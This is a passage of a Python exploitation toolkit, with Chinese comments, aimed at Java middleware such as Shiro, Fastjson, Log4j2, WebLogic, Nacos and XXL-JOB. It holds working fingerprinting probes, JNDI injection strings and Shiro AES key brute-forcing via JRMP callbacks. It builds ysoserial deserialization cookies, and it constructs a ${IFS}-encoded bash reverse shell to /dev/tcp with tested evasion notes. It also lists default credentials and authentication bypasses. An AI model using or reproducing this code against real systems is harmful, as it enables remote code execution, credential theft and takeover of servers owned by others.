    "--add-opens=java.rmi/sun.rmi.server=ALL-UNNAMED",
    "--add-exports=java.rmi/sun.rmi.transport=ALL-UNNAMED",
    "--add-exports=java.rmi/sun.rmi.transport.tcp=ALL-UNNAMED",
]

# java 主版本探测结果缓存（模块级，只探测一次）
_JAVA_MAJOR = {"done": False, "major": 0}


def java_major_version(java=""):
    """探测本机 java 主版本号：1.8.0_392 → 8；21.0.1 → 21。探测失败返回 0。

    结果缓存在模块级变量 _JAVA_MAJOR 里，`java -version` 全程只跑一次。
    """
    if _JAVA_MAJOR["done"]:
        return _JAVA_MAJOR["major"]
    java = java or shutil.which("java")
    major = 0
    if java:
        try:
            pr = subprocess.run([java, "-version"], stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, timeout=30)
            out = (pr.stdout + pr.stderr).decode("utf-8", "ignore")
            m = re.search(r'version\s+"([^"]+)"', out)
            parts = (m.group(1) if m else "").split(".")
            if parts and parts[0] == "1" and len(parts) > 1 and parts[1].isdigit():
                major = int(parts[1])            # 1.8.0_xxx → 8
            elif parts and parts[0].isdigit():
                major = int(parts[0])            # 9 / 17 / 21 …
        except Exception:
            major = 0
    _JAVA_MAJOR["done"] = True
    _JAVA_MAJOR["major"] = major
    return major


def yso_generate(gadget, cmd, jar=""):
    jar = jar or find_ysoserial()
    if not jar:
        return None, "未找到 ysoserial.jar（放到本目录或 tools/ 目录下）"
    java = shutil.which("java")
    if not java:
        return None, "未检测到 java"
    mj = java_major_version(java)
    args = [java]
    if mj >= 9:                                  # JDK8 加了会直接报 Unrecognized option
        args += _JDK9_ADDOPS
    args += ["-jar", jar, gadget, cmd]
    try:
        p = subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=120)
        if p.returncode != 0 or not p.stdout:
            err = (p.stderr.decode("utf-8", "ignore") or "生成失败")[:400]
            if "BadAttributeValueExpException" in err:
                err += ("\n提示：该 gadget 链需在 JDK8 环境下生成"
                        "（ysoserial 自身限制，JDK9+ 构造不出；本机 java 主版本 %d）" % mj)
            elif mj >= 9 and ("IllegalAccessError" in err or "InaccessibleObjectException" in err):
                err += ("\n提示：已自动附加 JDK9+ 的 --add-opens 参数仍然失败，"
                        "建议改用 JDK8 生成该链")
            return None, err
        return p.stdout, ""
    except Exception as e:
        return None, "%s: %s" % (type(e).__name__, e)


# ============================================================
# 指纹 / 版本探测
# ============================================================
def chk_shiro(base, to):
    r = http(base + "/", headers={"Cookie": "rememberMe=deleteMe;"}, timeout=to)
    sc = r["headers"].get("set-cookie", "")
    hit = "rememberMe=deleteMe" in sc or "rememberMe" in r["body"]
    return {"comp": "Shiro", "hit": hit, "risk": "高" if hit else "",
            "evidence": ("Set-Cookie: %s" % sc) if sc else ("响应体含 rememberMe" if hit else "无 rememberMe 特征"),
            "next": "爆破 Key → Key 已知为 Shiro-550(反序列化)，随机 Key 为 Shiro-721(Padding Oracle)",
            "actions": [["shiro.brutekey", "爆破Key"], ["shiro.exploit", "生成利用Cookie"]]}


def chk_fastjson(base, to, dns=""):
    r = http(base + "/", method="POST", data='{"@type":"java.lang.AutoCloseable"', timeout=to)
    b = r["body"]
    hit = any(k in b for k in ("fastjson", "com.alibaba", "AutoCloseable", "JSONException"))
    out = {"comp": "Fastjson", "hit": hit, "risk": "高" if hit else "",
           "evidence": ("响应: %s" % b[:200].replace("\n", " ")) if b else "无回显",
           "next": "版本判定(含1.2.83探测) → 1.2.68~1.2.83 走无Gadget RCE；出网走 JNDI，不出网走 BCEL/C3P0 链",
           "actions": [["fastjson.version", "版本判定"], ["fastjson.183", "1.2.83 无Gadget RCE"], ["fastjson.probe", "gadget链探测"], ["fastjson.send", "发送Payload"]]}
    if hit:
        out["evidence"] += " | 也可对真实 JSON 接口重发探测"
    return out


def chk_log4j2(base, to, dns=""):
    ev = "无指纹，只能盲打（UA/Referer/XFF/参数全打）"
    if dns:
        p = "${jndi:ldap://%s/a}" % dns
        http(base + "/", headers={"User-Agent": p, "Referer": p,
                                  "X-Forwarded-For": p, "X-Api-Version": p}, timeout=to)
        ev = "已打点 %s，请查 DNSLog/回调记录" % p
    return {"comp": "Log4j2", "hit": False, "risk": "中",
            "evidence": ev, "next": "启动 JNDI 服务 → 用 ldap://你的IP:1389/x 盲打所有输入点",
            "actions": [["log4j2.send", "盲打Payload"]]}


def chk_springboot(base, to):
    r = http(base + "/__deserkit_404__", timeout=to)
    wl = "Whitelabel Error Page" in r["body"]
    act = http(base + "/actuator", timeout=to)
    has_act = act["status"] == 200 and ("_links" in act["body"] or "self" in act["body"])
    hd = http(base + "/actuator/heapdump", timeout=to, method="HEAD")
    ev = []
    if wl:
        ev.append("Whitelabel Error Page")
    if has_act:
        ev.append("/actuator 可访问")
    if hd["status"] == 200:
        ev.append("/actuator/heapdump 可下载(%s)" % hd["headers"].get("content-length", "?"))
    hit = wl or has_act
    return {"comp": "SpringBoot", "hit": hit, "risk": "高" if has_act else ("中" if wl else ""),
            "evidence": "；".join(ev) or "未发现特征",
            "next": "actuator 未授权 → 读 env 凭据 / 拖 heapdump；3.x+ 可试 Gateway SpEL RCE",
            "actions": [["springboot.actuator", "探测Actuator"], ["springboot.env", "读env凭据"],
                        ["springboot.gateway", "Gateway RCE"]]}


def chk_jboss(base, to):
    paths = ["", "jmx-console/", "invoker/readonly", "invoker/EJBInvokerServlet",
             "jbossmq-httpil/HTTPServerILServlet"]
    codes = {}
    for p in paths:
        codes[p or "/"] = http(base + "/" + p, timeout=to)["status"]
    r0 = http(base + "/", timeout=to)
    title = ("JBoss" in r0["body"]) or ("WildFly" in r0["body"])
    hit = title or codes.get("jmx-console/") == 200 or codes.get("invoker/readonly") not in (0, 404)
    return {"comp": "JBoss/WildFly", "hit": hit, "risk": "高" if hit else "",
            "evidence": "首页特征:%s | %s" % (title, json.dumps(codes, ensure_ascii=False)),
            "next": "/invoker/readonly → CVE-2017-12149；jbossmq-httpil → CVE-2017-7504；jmx-console admin/admin",
            "actions": [["jboss.exploit", "12149利用"]]}


def chk_jackson(base, to):
    r = http(base + "/", method="POST",
             data='{"obj":{"@class":"java.net.Inet4Address"}}', timeout=to)
    b = r["body"]
    hit = any(k in b for k in ("jackson", "InvalidTypeId", "ClassNotFoundException",
                               "JsonMappingException"))
    return {"comp": "Jackson", "hit": hit, "risk": "中" if hit else "",
            "evidence": ("响应: %s" % b[:200].replace("\n", " ")) if b else "无回显",
            "next": "Jackson 默认不开多态类型(enableDefaultTyping)才危险；有 @class 回显异常即值得深挖",
            "actions": [["jackson.send", "发送Payload"]]}


def chk_nacos(base, to):
    r = http(base + "/nacos/", headers={"User-Agent": "Nacos-Server"}, timeout=to)
    u = http(base + "/nacos/v1/auth/users?pageNo=1&pageSize=10",
             headers={"User-Agent": "Nacos-Server"}, timeout=to)
    hit = ("nacos" in r["body"].lower()) or u["status"] == 200
    unauth = u["status"] == 200 and "username" in u["body"]
    ev = "/nacos/ 状态码 %s" % r["status"]
    if unauth:
        ev += "；用户接口未授权可访问: %s" % u["body"][:200]
    return {"comp": "Nacos", "hit": hit, "risk": "高" if unauth else ("中" if hit else ""),
            "evidence": ev,
            "next": "默认 nacos/nacos；UA 改 Nacos-Server 可绕鉴权；<=2.2.0 走 Derby RCE",
            "actions": [["nacos.users", "拉取用户"], ["nacos.derby", "Derby RCE"]]}


def chk_struts2(base, to):
    r = http(base + "/", timeout=to)
    a = http(base + "/index.action", timeout=to)
    hit = (".action" in r["body"]) or ("struts" in r["headers"].get("set-cookie", "").lower()) \
        or a["status"] == 200 or "Struts" in r["body"]
    return {"comp": "Struts2", "hit": hit, "risk": "高" if hit else "",
            "evidence": "首页 .action:%s | /index.action:%s | Server:%s"
                        % (".action" in r["body"], a["status"], r["headers"].get("server", "-")),
            "next": "确认编号(S2-045/057/016/048/061…) → OGNL 回显命令执行",
            "actions": [["struts2.cmd", "OGNL命令执行"], ["struts2.probe", "编号探测"]]}


def chk_xxljob(base, to):
    codes = {}
    for p in ("/", "/xxl-job-admin/", "/xxl-job-admin/toLogin", "/xxl-job-admin/jobinfo"):
        codes[p] = http(base + p, timeout=to)["status"]
    root = get_root(base)
    port = base.rsplit(":", 1)[-1] if ":" in base.split("://", 1)[-1] else "9999"
    run = None
    try:
        run_url = "%s:%s/run" % (root, port if base.count(":") == 1 else "9999")
        run = http(run_url, method="POST", data=json.dumps(
            {"jobId": 1, "executorHandler": "demoJobHandler", "executorParams": "",
             "glueType": "GLUE_SHELL", "glueSource": "echo deserkit"}), timeout=5)
    except Exception:
        pass
    hit = codes.get("/xxl-job-admin/") == 200 or (run and run["status"] in (200, 500))
    ev = json.dumps(codes, ensure_ascii=False)
    if run:
        ev += " | /run → %s %s" % (run["status"], run["body"][:80].replace("\n", " "))
    return {"comp": "XXL-JOB", "hit": hit, "risk": "高" if hit else "",
            "evidence": ev,
            "next": "执行器 9999 端口 /run 未授权 → 直接 GLUE_SHELL 命令执行；admin 默认 admin/123456",
            "actions": [["xxljob.cmd", "执行器命令执行"], ["xxljob.login", "默认口令登录"]]}


def chk_weblogic(base, to):
    codes = {}
    for p in ("/console/", "/wls-wsat/CoordinatorPortType",
              "/_async/AsyncResponseService", "/bea_wls_internal/"):
        codes[p] = http(base + p, timeout=to)["status"]
    hit = codes.get("/console/") in (200, 302) or codes.get("/wls-wsat/CoordinatorPortType") == 200
    return {"comp": "WebLogic", "hit": hit, "risk": "高" if hit else "",
            "evidence": json.dumps(codes, ensure_ascii=False),
            "next": "/console → 后台；/wls-wsat → CVE-2017-10271；/_async → CVE-2019-2725",
            "actions": [["weblogic.t3", "T3握手探测"], ["weblogic.probe", "探测可利用点"],
                        ["weblogic.weak", "弱口令爆破"], ["weblogic.payload", "CVE-2018-2628命令"]]}


def chk_xstream(base, to):
    r = ex_xstream_probe(base, {"path": "/", "timeout": to})
    hit = bool(r.get("ok")) and "解析点" in (r.get("output") or "")
    return {"comp": "XStream", "hit": hit, "risk": "高" if hit else "",
            "evidence": (r.get("output") or "")[:500],
            "next": "利用中心 → xstream.cmd（CVE-2021-21351 JNDI / 29505 RMI）" if hit
                    else "未发现接受 XML 的 POST 接口",
            "actions": [["xstream.cmd", "XStream 利用"]] if hit else []}


CHECKS = {
    "shiro": chk_shiro, "fastjson": chk_fastjson, "log4j2": chk_log4j2,
    "springboot": chk_springboot, "jboss": chk_jboss, "jackson": chk_jackson,
    "nacos": chk_nacos, "struts2": chk_struts2, "xxljob": chk_xxljob,
    "weblogic": chk_weblogic, "xstream": chk_xstream,
}
ALL = list(CHECKS.keys())


def do_scan(target, comps, timeout=8, dns=""):
    global STATE
    base = normalize(target)
    items = []
    comps = comps or ALL

    def work(key):
        fn = CHECKS[key]
        try:
            if key in ("fastjson", "log4j2"):
                return fn(base, timeout, dns)
            return fn(base, timeout)
        except Exception as e:
            return {"comp": key, "hit": False, "risk": "", "evidence": "探测异常: %s" % e,
                    "next": "", "actions": []}

    ths = []
    box = {}

    def runner(k):
        box[k] = work(k)

    for k in comps:
        if k not in CHECKS:
            continue
        t = threading.Thread(target=runner, args=(k,), daemon=True)
        t.start()
        ths.append(t)
    for t in ths:
        t.join(timeout + 10)
    for k in comps:
        if k in CHECKS:
            items.append(box.get(k) or {"comp": k, "hit": False, "risk": "",
                                        "evidence": "超时", "next": "", "actions": []})
    items.sort(key=lambda x: (not x.get("hit"),))
    log("扫描完成 %s，命中 %d/%d" % (base, sum(1 for i in items if i.get("hit")), len(items)))
    return {"target": base, "items": items}


# ============================================================
# 漏洞利用
# ============================================================
def _shiro_cookie(key_b64, raw_payload, alg="cbc", ivlen=None):
    """生成 rememberMe Cookie 的值（base64 字符串）。

    alg=cbc → base64(IV16 || CT)          AES-CBC + PKCS7，Shiro 默认/老版本
    alg=gcm → base64(IV || CT || TAG16)   AES-GCM，Shiro ≥1.5.3，IV 长度默认 16（也支持 12）
    """
    key = base64.b64decode(key_b64)
    if len(key) not in (16, 24, 32):
        raise ValueError("Key base64 解码后必须是 16/24/32 字节，实际 %d 字节" % len(key))
    alg = (alg or "cbc").strip().lower()
    if alg == "gcm":
        n = int(ivlen or 16)
        if n not in (12, 16):
            n = 16
        iv = bytes(random.getrandbits(8) for _ in range(n))
        ct, tag = aes_gcm_encrypt(key, iv, raw_payload)
        # 自检：自己生成的密文自己必须能解开，避免算错还静默发出去
        if aes_gcm_decrypt(key, iv, ct, tag) != raw_payload:
            raise ValueError("GCM 自检失败（加解密不自洽）")
        return base64.b64encode(iv + ct + tag).decode()
    iv = bytes(random.getrandbits(8) for _ in range(16))
    ct = aes_cbc_encrypt(key, iv, raw_payload)
    return base64.b64encode(iv + ct).decode()


def _tcp_listen(prefer_port=8890, tries=30):
    """在 0.0.0.0 上开一个普通 TCP 监听；端口被占用就顺延。返回 (sock, port)。

    Windows 下光看 bind 成功与否是不够的（重叠绑定不报错），所以每个候选端口都会先用
    _foreign_listener 预探一次，确认不是别人的服务后才真正绑定（同 bind_tcp_server）。
    """
    port = int(prefer_port or 8890)
    last = ""
    for i in range(max(1, int(tries))):
        if port > 65535:
            break
        # 绑定前探活：Windows 下「别人占着 127.0.0.1:P、我们绑 0.0.0.0:P」会被系统
        # 允许共存（且有没有 SO_REUSEADDR 都一样），bind 不报错却会和别人抢流量。
        # 所以和 bind_tcp_server / bind_socket 一样，先主动发现并顺延到下一个端口。
        if i < PORT_PRECHECK:
            foreign, who = _foreign_listener(port)
            if foreign:
                last = "%s:%d 已有其他服务在监听（非本进程）" % (who, port)
                port += 1
                continue
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Windows 上不设 SO_REUSEADDR。实测（Windows 11 / CPython 3.13）：
            #   · 别人占 0.0.0.0:P、我们再绑 0.0.0.0:P —— 设了 REUSE 报 WinError 10013
            #     （"权限不足"，纯误导），不设才报 10048（"地址已在使用"，准确）；
            #   · 别人占 127.0.0.1:P、我们再绑 0.0.0.0:P —— **设不设 REUSE 都能绑成功**，
            #     bind 压根不报错（Windows 下更具体的地址优先，允许重叠）。
            # 所以这个开关只负责把错误码弄准，真正的防冲突靠上面那次 _foreign_listener 预探。
            # （不是改用 SO_EXCLUSIVEADDRUSE：团队已评估否决 —— 它会让 TIME_WAIT 期间
            #   无法重新绑定，破坏「停止监听→立刻重启」的反弹 shell 流程。）
            if sys.platform != "win32":
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("0.0.0.0", port))
            s.listen(8)
            return s, port
        except OSError as e:
            last = str(e)
            if s is not None:
                try:
                    s.close()
                except Exception:
                    pass
            port += 1
    raise RuntimeError("起监听失败（从 %s 起试了 %s 个端口，最后错误：%s）"
                       % (prefer_port, tries, last))


def _jrmp_wait(sock, seconds=4.0):
    """在监听 socket 上等 seconds 秒；等到连接返回 (peer_ip, 前若干字节)，超时返回 None。"""
    if sock is None:
        return None
    try:
        sock.settimeout(seconds)
        conn, addr = sock.accept()
    except Exception:
        return None
    head = b""
    try:
        conn.settimeout(2.0)
        head = conn.recv(64)
    except Exception:
        pass
    try:
        conn.close()
    except Exception:
        pass
    return addr[0], head


def _jrmp_head_desc(head):
    """把回连的前几个字节讲成人话（JRMP 握手头是 JRMI\\x00\\x02K）。"""
    if not head:
        return "（连上了但没收到数据）"
    if head.startswith(b"JRMI"):
        return "JRMI 握手头 %s —— 确为 JRMP 协议" % head[:8].hex()
    return "前 16 字节: %s" % head[:16].hex()


def ex_shiro_brutekey(target, p):
    """爆破 Shiro rememberMe 的 AES 密钥。

    check=jrmp（默认，最可靠）：载荷用 ysoserial 的 JRMPClient(host:port)，
      目标只要“解密成功 + 反序列化了该对象”就会主动 TCP 回连本机监听端口 → 命中。
    check=deleteMe（老逻辑，易误判）：不回 rememberMe=deleteMe 即算命中。
      注意密钥错误（解密抛异常）与密钥正确但载荷不是 PrincipalCollection（ClassCastException）
      都会走 onRememberedPrincipalFailure → 同样回 deleteMe，所以这只能当辅助判据。

    alg: auto(依次试 cbc、gcm(16)) / cbc / gcm
    """
    base = normalize(target)
    keys = [k.strip() for k in (p.get("keys") or "").split(",") if k.strip()]
    keys = keys or SHIRO_KEYS
    to = int(p.get("timeout", 8))
    path = p.get("path") or "/"
    alg = (p.get("alg") or "auto").strip().lower()
    check = (p.get("check") or "jrmp").strip().lower()
    ivlen = int(p.get("ivlen") or 0) or None
    wait = float(p.get("wait") or 4)
    stop_first = str(p.get("all", "0")).strip().lower() not in ("1", "true", "yes")
    found = []
    hits = []
    detail = []

    if alg == "cbc":
        algs = [("cbc", 16)]
    elif alg == "gcm":
        algs = [("gcm", ivlen or 16)]
    else:
        algs = [("cbc", 16), ("gcm", ivlen or 16)]

    # 前置校验：Shiro 收到无效 rememberMe 必回 deleteMe；不回则大概率不是 Shiro
    junk = base64.b64encode(b"\xac\xed\x00\x05junk").decode()
    rj = http(base + path, headers={"Cookie": "rememberMe=%s" % junk}, timeout=to)
    if "rememberMe=deleteMe" not in rj["headers"].get("set-cookie", ""):
        return {"ok": False, "keys": [],
                "output": "目标疑似不是 Shiro（无效 rememberMe 未回 deleteMe），跳过爆破",
                "detail": "预检 Cookie 响应头: %s" % (rj["headers"].get("set-cookie") or "(无)")}

    # deleteMe 法的明文用一段非法序列化数据：key 正确→服务端能解密(报反序列化错,不再回 deleteMe)
    probe = base64.b64decode("rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==")
    payload = probe
    lsn = None
    lport = int(p.get("lport") or 8890)
    if check == "jrmp":
        lhost = ((p.get("lhost") or "").strip() or src_ip_for(target)
                 or (local_ips() or ["127.0.0.1"])[0])
        try:
            lsn, lport = _tcp_listen(lport)
        except Exception as e:
            detail.append("起监听失败：%s → 自动退回 deleteMe 判定" % e)
            check = "deleteMe"
        if lsn is not None:
            # JRMPClient 的参数语义是 host:port，不是 shell 命令；纯 JDK 类，目标无需任何第三方依赖
            raw, err = yso_generate("JRMPClient", "%s:%d" % (lhost, lport))
            if raw is None:
                try:
                    lsn.close()
                except Exception:
                    pass
                lsn = None
                detail.append("JRMPClient 载荷生成失败：%s → 自动退回 deleteMe 判定" % err)
                check = "deleteMe"
            else:
                payload = raw
                detail.append("回连法：本机监听 0.0.0.0:%d，载荷 JRMPClient(%s:%d)，%d 字节；"
                              "每发一个 key 等 %gs 回连" % (lport, lhost, lport, len(raw), wait))
    try:
        for k in keys:
            for a, n in algs:
                try:
                    ck = _shiro_cookie(k, payload, a, n)
                except Exception as e:
                    detail.append("%-26s [%-3s] → key 格式错误 %s" % (k, a, e))
                    continue
                r = http(base + path, headers={"Cookie": "rememberMe=%s" % ck}, timeout=to)
                if check == "jrmp":
                    got = _jrmp_wait(lsn, wait)
                    if got:
                        ip, head = got
                        hits.append({"key": k, "alg": a, "peer": ip})
                        if k not in found:
                            found.append(k)
                        detail.append("%-26s [%-3s] → ★回连命中：%s 连回本机:%d，%s"
                                      % (k, a, ip, lport, _jrmp_head_desc(head)))
                    else:
                        detail.append("%-26s [%-3s] → %gs 内无回连 status:%s"
                                      % (k, a, wait, r["status"]))
                else:
                    sc = r["headers"].get("set-cookie", "")
                    good = "rememberMe=deleteMe" not in sc
                    detail.append("%-26s [%-3s] → deleteMe:%-5s status:%s"
                                  % (k, a, not good, r["status"]))
                    if good:
                        hits.append({"key": k, "alg": a, "peer": ""})
                        if k not in found:
                            found.append(k)
                if found and stop_first:
                    break
            if found and stop_first:
                break
    finally:
        if lsn is not None:
            try:
                lsn.close()
            except Exception:
                pass

    brief = "，".join("%s(%s)" % (h["key"], h["alg"]) for h in hits) or "-"
    if check == "jrmp":
        note = ("\n\n判定说明：回连法命中 = 密钥正确 且 目标确实解密并反序列化了该对象"
                "（RCE 前置条件成立）；载荷是纯 JDK 类的 JRMPClient，不依赖目标任何第三方库。"
                "\n对比：deleteMe 消失不可靠——密钥错误(解密异常)与密钥正确但载荷不是"
                "PrincipalCollection(ClassCastException)都会走 onRememberedPrincipalFailure，同样回 deleteMe。")
        if found:
            output = ("★ 回连法命中 Key: %s —— 目标已解密并反序列化（RCE 前置条件成立）"
                      % brief)
        else:
            output = ("未命中任何 Key（%d 个 key × %s，回连法判定）"
                      % (len(keys), "/".join(a for a, _ in algs)))
    else:
        note = ("\n\n判定说明：deleteMe 法命中 = 目标未回 rememberMe=deleteMe；"
                "该判据存在误判（详见上面说明），建议改用 check=jrmp 复核。")
        output = ("命中 Key: %s（deleteMe 判定，建议用回连法复核）" % brief) if found \
            else "未命中任何 Key"
    if found and stop_first:
        note += "\n（命中即停；要把剩余 key 也测完请把参数 all 设为 1）"
    return {"ok": bool(found), "keys": found, "hits": hits,
            "output": output, "detail": "\n".join(detail) + note}


def ex_shiro_exploit(target, p):
    """Shiro rememberMe 反序列化利用。

    mode=cmd（默认）：把 cmd 交给 ysoserial 生成 gadget（语义同原来）。
    mode=shell：自动起反弹监听 + 自动构造正确的反弹命令。

    为什么必须自动构造：ysoserial 生成的 gadget 最终是
        Runtime.getRuntime().exec(String)
    其内部用 StringTokenizer 按空白切分，**完全不经过 shell** —— 直接填
        bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
    时 `>&`、`0>&1` 只会被当成普通参数传给 bash，必然失败；加引号也没用
    （引号 tokenize 后成为字面量字符）。

    正确写法 —— 把每个空格换成 ${IFS}（bash 自己会把它展开成空格）：
        bash -c bash${IFS}-i${IFS}>&/dev/tcp/1.2.3.4/4444${IFS}<&1
    StringTokenizer 找不到空白 → 整条命令作为**单个 argv** 交给 `bash -c`；
    bash 再把 ${IFS} 还原成空格，真正执行 `bash -i >& /dev/tcp/1.2.3.4/4444 0<&1`。
    全程无空格、无管道、无引号、无 base64 —— 没有任何会被 exec(String) 吃掉的东西。
    （已实测：监听端口收到连接，并能在对端执行命令、拿回 stdout 与 stderr。）

    ⚠ 两个必须避开的坑（都是本机实测结论，改回去就会哑火）：

    坑 1 —— 最后一段不能写成 `${IFS}0>&1`：
        bash -c bash${IFS}-i${IFS}>&/dev/tcp/1.2.3.4/4444${IFS}0>&1      ← 错的
      因为**这条命令连上之后会立刻断**：实测（本机 bash 5.3）：TCP 会连上、监听侧能 accept，但 bash 随即退出、连接被 RST，发过去的命令没有任何回显，拿不到可用会话 —— 它并不是 ambiguous redirect（那个错误只在重定向目标本身含 ${IFS} 时才报，如 `>${IFS}a${IFS}b`）；正确写法 ${IFS}<&1 实测 3/3 连上且能发命令收回显。
      正确做法是让 ${IFS} 落在重定向词的**末尾**：`…/4444${IFS}<&1`
        · 目标词 `/dev/tcp/…/4444${IFS}` 展开后尾部空白被字段切分剥掉 → 只剩 1 段，不报错；
        · 紧跟着的 `<&1` 不带 fd 号，所以 ${IFS} 后面直接是元字符 `<`，不会被并进同一个词；
        · 普通命令词位置的 `bash${IFS}-i` 字段切分正常生效 → `bash` `-i`。

    坑 2 —— 早先版本用花括号 + base64：
        bash -c {echo,<BASE64>}|{base64,-d}|{bash,-i}
      实测它是**能**弹回来的（`{echo,B64}` 被 bash 展开成 `echo B64`，整条就是
      `echo B64 | base64 -d | bash -i`），但依赖目标机器上有 base64 程序，命令又长又难读，
      busybox / 精简镜像上容易哑火。${IFS} 版只依赖 bash 自身，所以统一用 ${IFS} 版，
      不再引入花括号形式。
    """
    key = (p.get("key") or "").strip()
    mode = (p.get("mode") or "cmd").strip().lower()
    gadget = (p.get("gadget") or "CommonsBeanutils1").strip()
    jar = p.get("jar", "")
    alg = (p.get("alg") or "auto").strip().lower()
    do_send = str(p.get("send", "1")).strip().lower() not in ("0", "", "false", "no")
    if not key:
        return {"ok": False, "output": "请先填 Key"}
    lhost = ((p.get("lhost") or "").strip() or src_ip_for(target)
             or (local_ips() or ["127.0.0.1"])[0])
    lport = int(p.get("lport") or (PORT_DEFAULT["listener"] if mode == "shell" else 8890))
    notes = []
    rev_real = ""

    if mode == "shell":
        if gadget == "JRMPClient":
            return {"ok": False,
                    "output": "mode=shell 与 gadget=JRMPClient 不能一起用",
                    "detail": "JRMPClient 的参数语义是 host:port（不是命令），它只让目标回连本机；\n"
                              "要拿 shell 请用本页最下方的「JRMP 两段式」：先起 JRMPListener，\n"
                              "再用 JRMPClient 让目标回连，由 JRMPListener 投递真正的 gadget。"}
        # ① 自动开监听（端口被占/被 Windows 保留区间拦住时会自动顺延，以返回值里的为准）
        lst = listener_start({"port": lport})
        if not lst.get("ok"):
            return {"ok": False, "output": "反弹监听起不来: %s" % (lst.get("msg") or ""),
                    "detail": lst.get("advice") or ""}
        lport = int(lst.get("port") or lport)
        # ② 自动构造免 shell 元字符的反弹命令（用 % 格式化，勿改成 .format()）
        rev_real = "bash -i >& /dev/tcp/%s/%d 0>&1" % (lhost, lport)
        # 注意是 `${IFS}<&1` 而不是 `${IFS}0>&1`：实测（本机 bash 5.3）：TCP 会连上、监听侧能 accept，但 bash 随即退出、连接被 RST，发过去的命令没有任何回显，拿不到可用会话 —— 它并不是 ambiguous redirect（那个错误只在重定向目标本身含 ${IFS} 时才报，如 `>${IFS}a${IFS}b`）；正确写法 ${IFS}<&1 实测 3/3 连上且能发命令收回显。
        cmd = "bash -c bash${IFS}-i${IFS}>&/dev/tcp/%s/%d${IFS}<&1" % (lhost, lport)
        notes.append(
            "★ 反弹 shell 模式：已自动监听 0.0.0.0:%d%s\n"
            "  真实反弹命令 : %s\n"
            "  实际下发命令 : %s\n"
            "  为什么这么写 : ysoserial 生成的是 Runtime.getRuntime().exec(String)，内部 StringTokenizer\n"
            "                 按空白切分、完全不经过 shell —— `>&`、`0>&1` 会被当成普通参数传给 bash，\n"
            "                 直接写原命令必然失败，加引号也没用（引号 tokenize 后是字面量）。\n"
            "                 所以下发的是「无空格版」：空格位置全用 ${IFS} 代替（bash 会把它展开成空格），\n"
            "                 整条命令无空格 → tokenize 后是单个 argv，且无管道 / 无引号 / 无 base64。\n"
            "  ⚠ 结尾只能是 `${IFS}<&1`：写成 `${IFS}0>&1` 时实测（本机 bash 5.3）：TCP 会连上、监听侧能 accept，但 bash 随即退出、连接被 RST，发过去的命令没有任何回显，拿不到可用会话 —— 它并不是 ambiguous redirect（那个错误只在重定向目标本身含 ${IFS} 时才报，如 `>${IFS}a${IFS}b`）；正确写法 ${IFS}<&1 实测 3/3 连上且能发命令收回显。\n"
            "    实测 `${IFS}<&1` 版：监听端口收到连接，且能执行命令并拿回 stdout / stderr。"
            % (lport,
               ("（%d 不可用，已自动顺延）" % lst.get("requested_port"))
               if lst.get("requested_port") and int(lst["requested_port"]) != lport else "",
               rev_real, cmd))
        if lst.get("notes"):
            notes.append("监听端口自动调整：%s" % "；".join(lst["notes"]))
        if not lst.get("requested_port") and "已在监听" in (lst.get("msg") or ""):
            notes.append("本机此前已有一个监听在跑（端口 %d），本次沿用它；"
                         "想换端口先去「反弹Shell」页签点「停止」再执行。" % lport)
        log("Shiro shell 模式：监听 %d，下发 %s" % (lport, cmd))
    else:
        cmd = (p.get("cmd") or "").strip() or "whoami"
        if re.search(r"[><|&;`$]", cmd):
            notes.append(
                "★ 警告：命令里有 shell 元字符（> | & ; $ `），但它们**不会生效**。\n"
                "  ysoserial 生成的是 Runtime.getRuntime().exec(String)：内部 StringTokenizer 按空白切分，\n"
                "  完全不经过 shell —— `>&`、`0>&1`、`|`、`&&` 只会当成普通参数传给目标程序。\n"
                "  → 需要 shell 语义请改用 mode=shell（自动开监听 + 自动构造正确命令）；\n"
                "  → 或手工把每个空格换成 ${IFS}（bash 会把它展开成空格），例如：\n"
                "       bash -c bash${IFS}-i${IFS}>&/dev/tcp/1.2.3.4/4444${IFS}<&1\n"
                "    （无空格 → 单个 argv；不用引号、不用管道、不用 base64。）\n"
                "    ⚠ 结尾必须是 ${IFS}<&1：写成 ${IFS}0>&1 时实测（本机 bash 5.3）：TCP 会连上、监听侧能 accept，但 bash 随即退出、连接被 RST，发过去的命令没有任何回显，拿不到可用会话 —— 它并不是 ambiguous redirect（那个错误只在重定向目标本身含 ${IFS} 时才报，如 `>${IFS}a${IFS}b`）；正确写法 ${IFS}<&1 实测 3/3 连上且能发命令收回显。")

    if gadget == "JRMPClient":
        # JRMPClient 的参数是 host:port（语义不是命令）：目标反序列化后主动回连该地址
        if cmd == "whoami" or ":" not in cmd:
            cmd = "%s:%d" % (lhost, lport)
        notes.append("★ JRMPClient 的参数语义是 host:port，不是 shell 命令：本次填的是 %s，"
                     "目标反序列化后会主动 TCP 回连这个地址；要接着打 RCE 需先在本机起 "
                     "java -cp ysoserial.jar ysoserial.exploit.JRMPListener %d <gadget> <cmd>。" % (cmd, lport))
    raw, err = yso_generate(gadget, cmd, jar)
    if raw is None:
        return {"ok": False, "output": "gadget 生成失败: %s" % err,
                "detail": "手工命令:\njava -jar ysoserial.jar %s \"%s\" | base64 -w0\n"
                          "再用 shiro 加密脚本生成 rememberMe Cookie（ ysoserial 请用 JDK8 跑 ）"
                          % (gadget, cmd)}
    try:
        cbc_ck = _shiro_cookie(key, raw, "cbc")
        gcm_ck = _shiro_cookie(key, raw, "gcm", int(p.get("ivlen") or 16))
    except Exception as e:
        return {"ok": False, "output": "Cookie 生成失败: %s" % e,
                "detail": "检查 Key 是否为合法 base64、解码后是否 16/24/32 字节。"}
    if alg == "gcm":
        cookies = [("gcm(IV16||CT||TAG)", gcm_ck)]
    elif alg == "cbc":
        cookies = [("cbc(IV16||CT)", cbc_ck)]
    else:
        cookies = [("cbc(IV16||CT)", cbc_ck), ("gcm(IV16||CT||TAG)", gcm_ck)]
    out = {"ok": True, "cookie": cookies[0][1], "cmd": cmd, "gadget": gadget,
           "mode": mode, "lhost": lhost, "lport": lport,
           "output": "rememberMe Cookie 已生成（%s）"
                     % "，".join("%s 长度%d" % (a, len(c)) for a, c in cookies)}
    if len(cookies) > 1:
        out["cookie_gcm"] = gcm_ck
    if mode == "shell":
